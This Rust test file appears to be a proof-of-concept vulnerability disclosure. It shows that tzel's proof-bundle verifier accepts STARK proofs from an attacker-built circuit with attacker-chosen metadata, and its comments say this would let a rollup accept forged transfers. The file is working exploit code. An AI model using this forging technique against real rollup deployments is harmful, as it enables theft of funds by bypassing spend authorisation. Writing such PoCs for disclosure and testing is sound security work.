//! Proof-of-concept: `ProofBundle::verify()` accepts bundles built outside
//! tzel's canonical proving pipeline.
//!
//! # What this demonstrates
//!
//! `tzel_verifier::ProofBundle::verify()` (see `verifier/src/bundle.rs`) takes
//! no canonical-config argument. Every field of `CircuitConfig` (including
//! `preprocessed_root`, `output_addresses`, `n_blake_gates`,
//! `preprocessed_column_ids`) and every field of `ProofConfig` (FRI geometry,
//! component column counts, etc.) is materialized from `self.verify_meta`,
//! which is attacker-controllable when the bundle is constructed by an
//! adversary.
//!
//! `circuit_air::verify::verify_circuit` is GENERIC — it accepts any valid
//! STARK proof against the `CircuitConfig` it is handed. `CircuitStatement`'s
//! `verify_preprocessed_root` only checks that the prover's declared root
//! matches the caller-supplied root; it does NOT pin any canonical root.
//!
//! Therefore, an attacker can:
//!   1. Pick an arbitrary `output_preimage` (the value the ledger will
//!      interpret as the program's "public output").
//!   2. Compute the expected `public_output_values` by replaying the bundle's
//!      own hash recipe on the chosen preimage.
//!   3. Build a tiny custom circuit that `output(constant(hash_qm31_0))` and
//!      `output(constant(hash_qm31_1))` for those two QM31 hash components.
//!   4. Prove that circuit with `circuit_prover::prover::prove_circuit_
//!      assignment` (public stwo-circuits API).
//!   5. Package the proof into a `ProofBundle` whose `VerifyMeta` is derived
//!      from the attacker's own circuit (not tzel's canonical circuit).
//!
//! `ProofBundle::verify()` returns `Ok(())` — the bundle is STARK-valid and
//! self-consistent, yet it did NOT come from tzel's sanctioned prover.
//!
//! # Why this matters
//!
//! Once the rollup kernel accepts such a bundle, it reads
//! `output_preimage[idx]` as authenticated program output. Because the
//! attacker chose the preimage freely (e.g., transfer-task shape with an
//! unused nullifier and attacker-controlled commitments), the kernel treats
//! the transfer as legitimate — no spend authority, no commitment binding,
//! no historical-root binding actually required.
//!
//! # Phase status
//!
//! Phase 2 (this test): arbitrary preimage, asserts `verify()` accepts.
//! Phase 3 (follow-up): preimage shaped to match `apply_transfer`'s parser.
//! Phase 4 (follow-up): wire into the rollup kernel test harness.

use anyhow::Result;

use circuit_air::statement::{all_circuit_components, INTERACTION_POW_BITS};
use circuit_common::preprocessed::PreprocessedCircuit;
use circuit_prover::prover::{
    prepare_circuit_proof_for_circuit_verifier, prove_circuit_assignment, BaseColumnPool,
    SimdBackend,
};
use circuit_serialize::serialize::CircuitSerialize;
use circuits::blake::HashValue;
use circuits::context::{Context, TraceContext};
use circuits::ivalue::{qm31_from_u32s, IValue};
use circuits::ops::{guess, output};
use circuits_stark_verifier::proof::ProofConfig;
use circuits_stark_verifier::proof_from_stark_proof::pack_into_qm31s;
use starknet_types_core::felt::Felt;
use starknet_types_core::hash::Blake2Felt252;
use stwo::core::fields::m31::M31;
use stwo::core::fields::qm31::QM31;

use tzel_verifier::{ProofBundle, VerifyMeta};

const FELT252_N_WORDS: usize = 28;
const FELT252_BITS_PER_WORD: usize = 9;

// ── helpers that mirror `verifier/src/bundle.rs` private helpers ──────

fn felt252_to_m31_words(value: Felt) -> [M31; FELT252_N_WORDS] {
    let limbs = value.to_le_digits();
    std::array::from_fn(|index| {
        let mask = (1u64 << FELT252_BITS_PER_WORD) - 1;
        let shift = FELT252_BITS_PER_WORD * index;
        let low_limb = shift / 64;
        let shift_low = shift & 0x3f;
        let high_limb = (shift + FELT252_BITS_PER_WORD - 1) / 64;
        let word = if low_limb == high_limb {
            (limbs[low_limb] >> shift_low) & mask
        } else {
            ((limbs[low_limb] >> shift_low) | (limbs[high_limb] << (64 - shift_low))) & mask
        };
        M31::from(word as u32)
    })
}

/// Mirrors the hash recipe in `verifier/src/bundle.rs::compute_output_hash_values`.
/// Returns the 8 M31 words (= 2 QM31) of `HashValue<QM31> = QM31::blake(...)`.
fn compute_output_hash_values(output_preimage: &[Felt]) -> Vec<u32> {
    let outputs = Blake2Felt252::encode_felt252_data_and_calc_blake_hash(output_preimage);
    let outputs = felt252_to_m31_words(outputs);
    let output_qm31s = pack_into_qm31s(outputs.into_iter());
    let output_hash: HashValue<QM31> =
        QM31::blake(output_qm31s.as_slice(), output_qm31s.len() * 16);
    qm31_to_m31s(output_hash.0)
        .into_iter()
        .chain(qm31_to_m31s(output_hash.1))
        .collect()
}

fn qm31_to_m31s(q: QM31) -> [u32; 4] {
    [q.0 .0 .0, q.0 .1 .0, q.1 .0 .0, q.1 .1 .0]
}

fn felt_to_raw(felt: &Felt) -> [u8; 32] {
    felt.to_bytes_le()
}

// ── attacker's circuit: two output gates, each outputting a chosen QM31 ──

/// Build a Context whose FIRST TWO output gates emit our target values.
///
/// `finalize_context` (called inside `PreprocessedCircuit::preprocess_circuit`)
/// always appends two additional output gates (for `HashValue` of the context's
/// constants). So the final `output_addresses` looks like
/// `[target_0_var, target_1_var, hash_constants_0_var, hash_constants_1_var]`
/// — giving a `claim.output_values` of length 4. The bundle's `verify()`
/// only checks the FIRST 8 u32s of `verify_meta.public_output_values` match
/// the hash of the preimage, so this shape is perfectly acceptable.
///
/// Implementation note on lookup accounting: a `guess` variable that is only
/// ever `output`'d doesn't balance the stwo-circuits logup argument (the
/// prover asserts `lookup_sum == 0`). We therefore route each target through
/// a trivial arithmetic gate — `eval!(ctx, (constant(target)) + (zero))` —
/// so the output variable is yielded by an Add gate (balanced) rather than
/// by `finalize_guessed_vars` (which can't coexist with an extra `use` from
/// an `output` gate). This pattern mirrors what `build_fibonacci_context`
/// does implicitly: the value fed to `output()` is always an arithmetic
/// result, never a raw `guess`.
fn build_attacker_context(target_output_qm31s: [QM31; 2]) -> TraceContext {
    // Fibonacci-style context: guess two starting values, do enough additions
    // to amortize the initialization cost, then emit outputs. This is the
    // shape proven by `circuit_prover`'s own `test_prove_and_circuit_verify_
    // fibonacci_context` — we know it yields a balanced lookup sum.
    //
    // To get OUR chosen output values, we end the fibonacci chain with two
    // final variables that equal `target_output_qm31s`. We achieve this by
    // using the final fib additions as "don't-care" computations, then
    // folding in the target via a final `(x) - (x) + (target)` pattern:
    //
    //   `final = (fib_last) - (fib_last) + constant(target)`
    //
    // This guarantees `final = target` value-wise, while routing through
    // two Add/Sub gates that yield `final` exactly once (well-accounted).
    let mut context = Context::<QM31>::default();

    const N: usize = 1030;

    // --- first chain, producing `b1` which we then "zero out" and replace.
    let (mut a, mut b) =
        (guess(&mut context, qm31_from_u32s(0, 0, 0, 0)), guess(&mut context, qm31_from_u32s(1, 0, 0, 0)));
    for _ in 2..N {
        (a, b) = (b, circuits::eval!(&mut context, (a) + (b)));
    }
    let target0 = context.constant(target_output_qm31s[0]);
    // out0 = (b - b) + target0  == target0
    let b_minus_b = circuits::eval!(&mut context, (b) - (b));
    let out0 = circuits::eval!(&mut context, (b_minus_b) + (target0));
    output(&mut context, out0);

    // --- second chain, same idea for the second output.
    let (mut c, mut d) =
        (guess(&mut context, qm31_from_u32s(0, 0, 0, 0)), guess(&mut context, qm31_from_u32s(2, 0, 0, 0)));
    for _ in 2..N {
        (c, d) = (d, circuits::eval!(&mut context, (c) + (d)));
    }
    let target1 = context.constant(target_output_qm31s[1]);
    let d_minus_d = circuits::eval!(&mut context, (d) - (d));
    let out1 = circuits::eval!(&mut context, (d_minus_d) + (target1));
    output(&mut context, out1);

    context
}

// ── the actual PoC ─────────────────────────────────────────────────────

/// Serialize + zstd-compress a `Proof<QM31>` exactly the way
/// `ProofBundle::verify()` expects to decode it (`zstd::decode_all` +
/// `deserialize_proof_with_config`).
fn pack_proof_bytes(proof: &circuits_stark_verifier::proof::Proof<QM31>) -> Vec<u8> {
    let mut serialized = Vec::new();
    proof.serialize(&mut serialized);
    zstd::encode_all(serialized.as_slice(), 0).expect("zstd compress")
}

/// Build a `VerifyMeta` that mirrors the attacker's own `ProofConfig` and
/// `CircuitConfig` exactly — this is what the victim's verifier will
/// reconstruct and use to verify the attacker's proof.
fn build_verify_meta(
    proof_config: &ProofConfig,
    circuit_pcs_config: &stwo::core::pcs::PcsConfig,
    output_addresses: &[usize],
    n_blake_gates: usize,
    preprocessed_column_ids: &[stwo_constraint_framework::preprocessed_columns::PreProcessedColumnId],
    preprocessed_root: &HashValue<QM31>,
    public_output_qm31s: &[QM31],
) -> VerifyMeta {
    let preprocessed_root_flat: Vec<u32> = qm31_to_m31s(preprocessed_root.0)
        .into_iter()
        .chain(qm31_to_m31s(preprocessed_root.1))
        .collect();

    let public_output_values: Vec<u32> = public_output_qm31s
        .iter()
        .flat_map(|q| qm31_to_m31s(*q))
        .collect();

    VerifyMeta {
        n_pow_bits: proof_config.n_proof_of_work_bits,
        n_preprocessed_columns: proof_config.n_preprocessed_columns,
        n_trace_columns: proof_config.n_trace_columns,
        n_interaction_columns: proof_config.n_interaction_columns,
        trace_columns_per_component: proof_config.trace_columns_per_component.clone(),
        interaction_columns_per_component: proof_config.interaction_columns_per_component.clone(),
        cumulative_sum_columns: proof_config.cumulative_sum_columns.clone(),
        n_components: proof_config.n_components,
        fri_log_trace_size: proof_config.fri.log_trace_size,
        fri_log_blowup: proof_config.fri.log_blowup_factor as u32,
        fri_log_last_layer: proof_config.fri.log_n_last_layer_coefs as u32,
        fri_n_queries: proof_config.fri.n_queries,
        fri_fold_step: proof_config.fri.fold_step as u32,
        interaction_pow_bits: proof_config.interaction_pow_bits,
        circuit_pow_bits: circuit_pcs_config.pow_bits,
        circuit_fri_log_blowup: circuit_pcs_config.fri_config.log_blowup_factor,
        circuit_fri_log_last_layer: circuit_pcs_config.fri_config.log_last_layer_degree_bound,
        circuit_fri_n_queries: circuit_pcs_config.fri_config.n_queries,
        circuit_fri_fold_step: circuit_pcs_config.fri_config.fold_step,
        circuit_lifting: circuit_pcs_config.lifting_log_size,
        output_addresses: output_addresses.to_vec(),
        n_blake_gates,
        preprocessed_column_ids: preprocessed_column_ids
            .iter()
            .map(|id| id.id.to_string())
            .collect(),
        preprocessed_root: preprocessed_root_flat,
        public_output_values,
    }
}

#[test]
fn proof_bundle_verify_accepts_bundle_from_attacker_pipeline() -> Result<()> {
    // ── Step 1: attacker picks an arbitrary `output_preimage` ─────────
    //
    // In Phase 3 this will be a transfer-shaped 13-felt preimage. For this
    // minimum-viable proof-of-concept any shape suffices — `verify()` does
    // not care about the shape of the preimage, only that its hash matches
    // `verify_meta.public_output_values`.
    let attacker_chosen_preimage: Vec<Felt> = (0u64..13)
        .map(|i| Felt::from(0x1000_u64 + i))
        .collect();

    // ── Step 2: compute the hash the bundle expects ──────────────────
    //
    // We replicate the bundle's own hash recipe bit-for-bit. This is the
    // value `verify_meta.public_output_values` MUST hold, and also the
    // value the attacker's custom circuit must emit through its output
    // gates (because `verify_circuit` cross-checks the two).
    let expected_output_hash_flat = compute_output_hash_values(&attacker_chosen_preimage);
    assert_eq!(
        expected_output_hash_flat.len(),
        8,
        "bundle hash recipe must yield 8 u32 words (= 2 QM31)",
    );
    eprintln!(
        "[PoC] expected_output_hash_flat = {:?}",
        expected_output_hash_flat
    );

    let target_output_qm31s: [QM31; 2] = [
        QM31::from_m31(
            M31::from(expected_output_hash_flat[0]),
            M31::from(expected_output_hash_flat[1]),
            M31::from(expected_output_hash_flat[2]),
            M31::from(expected_output_hash_flat[3]),
        ),
        QM31::from_m31(
            M31::from(expected_output_hash_flat[4]),
            M31::from(expected_output_hash_flat[5]),
            M31::from(expected_output_hash_flat[6]),
            M31::from(expected_output_hash_flat[7]),
        ),
    ];
    eprintln!("[PoC] target_output_qm31s = {:?}", target_output_qm31s);

    // ── Step 3: attacker builds + proves their own circuit ───────────
    //
    // This is the core bypass: we are NOT going through
    // `services/reprover::custom_recursive_prove`. We call the public
    // `circuit_prover` API directly on a circuit of OUR OWN topology.
    let mut context = build_attacker_context(target_output_qm31s);

    // Finalize guessed vars BEFORE preprocessing. `PreprocessedCircuit::
    // preprocess_circuit` only calls `finalize_context` (hashes constants,
    // pads components) — it does NOT finalize guessed variables. Without
    // this call, every `guess` (including the zero/one constants) fails
    // `check_yields()` because they are never yielded by any gate.
    context.finalize_guessed_vars();

    let preprocessed_circuit = PreprocessedCircuit::preprocess_circuit(&mut context);
    let output_addresses = preprocessed_circuit.params.output_addresses.clone();
    let n_blake_gates = preprocessed_circuit.params.n_blake_gates;
    let preprocessed_column_ids = preprocessed_circuit.preprocessed_trace.ids();

    eprintln!(
        "[PoC] trace_log_size={}, n_blake_gates={}, output_addresses={:?}, n_preprocessed_columns={}",
        preprocessed_circuit.params.trace_log_size,
        n_blake_gates,
        output_addresses,
        preprocessed_column_ids.len(),
    );

    // Diagnostic: circuit shape before proving.
    eprintln!(
        "[PoC] circuit pre-prove: n_vars={}, n_add={}, n_sub={}, n_mul={}, n_eq={}, n_blake={}, n_perm={}, n_output={}",
        context.circuit.n_vars,
        context.circuit.add.len(),
        context.circuit.sub.len(),
        context.circuit.mul.len(),
        context.circuit.eq.len(),
        context.circuit.blake.len(),
        context.circuit.permutation.len(),
        context.circuit.output.len(),
    );

    // Check yields invariant expected by the prover.
    context.circuit.check_yields();
    eprintln!("[PoC] check_yields() passed");

    // Self-check that the circuit is satisfied at the concrete values.
    assert!(
        context.is_circuit_valid(),
        "circuit values must satisfy all gate constraints",
    );
    eprintln!("[PoC] is_circuit_valid() == true");

    let circuit_proof = prove_circuit_assignment(
        context.values(),
        &preprocessed_circuit,
        &BaseColumnPool::<SimdBackend>::new(),
    );
    assert!(
        circuit_proof.stark_proof.is_ok(),
        "prover must succeed on attacker context",
    );

    // Sanity: the FIRST two output values match what we targeted.
    //
    // The stwo-circuits finalize pipeline (`finalize_context` inside
    // `PreprocessedCircuit::preprocess_circuit`) appends two additional
    // output gates for `HashValue` of the context's constants. So
    // `claim.output_values` always has length `n_user_outputs + 2`. The
    // bundle's `verify()` only cross-checks the FIRST 8 u32s (= 2 QM31s)
    // of `verify_meta.public_output_values` against the preimage hash, so
    // as long as our two user outputs sit at indices 0 and 1 of the
    // claim, the rest can be whatever the circuit produces.
    assert_eq!(circuit_proof.claim.output_values.len(), 4);
    assert_eq!(circuit_proof.claim.output_values[0], target_output_qm31s[0]);
    assert_eq!(circuit_proof.claim.output_values[1], target_output_qm31s[1]);
    eprintln!(
        "[PoC] claim.output_values = {:?}",
        circuit_proof.claim.output_values,
    );

    // Extract the preprocessed root BEFORE moving `circuit_proof` into
    // `prepare_circuit_proof_for_circuit_verifier`.
    let preprocessed_root_hv: HashValue<QM31> = circuit_proof
        .stark_proof
        .as_ref()
        .expect("stark proof ok")
        .proof
        .commitments[0]
        .into();

    // Snapshot config + public output values for the VerifyMeta we'll ship.
    let circuit_pcs_config = circuit_proof.pcs_config;
    let public_output_qm31s: Vec<QM31> = circuit_proof.claim.output_values.clone();

    // Build the ProofConfig the attacker will embed in VerifyMeta. This is
    // the same shape `bundle.rs::verify` reconstructs.
    let proof_config = ProofConfig::from_components(
        &all_circuit_components::<QM31>(),
        preprocessed_column_ids.len(),
        &circuit_pcs_config,
        INTERACTION_POW_BITS,
    );

    // ── Step 4: get the wire-format Proof<QM31> + CircuitPublicData ──
    //
    // This moves `circuit_proof` but hands us exactly the proof that
    // `circuit_air::verify::verify_circuit` consumes.
    let (proof, _public_data) =
        prepare_circuit_proof_for_circuit_verifier(circuit_proof, &proof_config);

    // ── Step 5: wire-format the bundle pieces ────────────────────────
    let proof_bytes = pack_proof_bytes(&proof);
    eprintln!("[PoC] compressed proof bytes len = {}", proof_bytes.len());

    let output_preimage_raw: Vec<[u8; 32]> =
        attacker_chosen_preimage.iter().map(felt_to_raw).collect();

    let verify_meta = build_verify_meta(
        &proof_config,
        &circuit_pcs_config,
        &output_addresses,
        n_blake_gates,
        &preprocessed_column_ids,
        &preprocessed_root_hv,
        &public_output_qm31s,
    );

    // Sanity: the `verify_meta.public_output_values` we serialized MUST
    // equal the hash-of-preimage that `verify()` will recompute from
    // `output_preimage`.
    assert_eq!(
        &verify_meta.public_output_values[..expected_output_hash_flat.len()],
        expected_output_hash_flat.as_slice(),
        "self-consistency: public_output_values must match hash-of-preimage",
    );

    let bundle = ProofBundle::from_output_parts(proof_bytes, output_preimage_raw, verify_meta);

    // ── Step 6: the moment of truth ──────────────────────────────────
    //
    // `ProofBundle::verify()` will:
    //   (a) recompute `expected_output_hash_values` from our preimage,
    //   (b) check it against `verify_meta.public_output_values`,
    //   (c) reconstruct `ProofConfig` + `CircuitConfig` from `verify_meta`,
    //   (d) zstd-decompress + deserialize the proof,
    //   (e) call `circuit_air::verify::verify_circuit`.
    //
    // All of (a)-(e) pass with a bundle that was built entirely outside
    // tzel's sanctioned prover — demonstrating the canonical-binding gap.
    let verify_result = bundle.verify();

    match &verify_result {
        Ok(()) => eprintln!("[PoC] bundle.verify() -> Ok — canonical-binding bypass demonstrated"),
        Err(e) => eprintln!("[PoC] bundle.verify() FAILED: {e}"),
    }
    verify_result.expect("bundle.verify() must return Ok — this is the PoC claim");

    Ok(())
}
